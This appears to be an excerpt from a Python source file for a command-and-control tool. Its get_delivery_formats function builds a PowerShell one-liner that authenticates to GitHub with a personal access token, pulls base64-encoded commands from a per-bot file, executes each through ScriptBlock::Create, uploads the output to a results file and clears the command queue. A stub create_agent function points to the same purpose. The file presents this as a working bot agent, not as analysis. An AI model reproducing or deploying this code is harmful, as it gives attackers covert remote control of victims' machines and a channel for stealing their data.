...
def get_delivery_formats():
    ...
    try:
        ...
        # Generate the dynamic PowerShell command
        dynamic_powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{bot_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json);if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}'
...
def create_agent():
    ...
    try:
        ...
        # Generate PowerShell command with the new UUID using the specific format
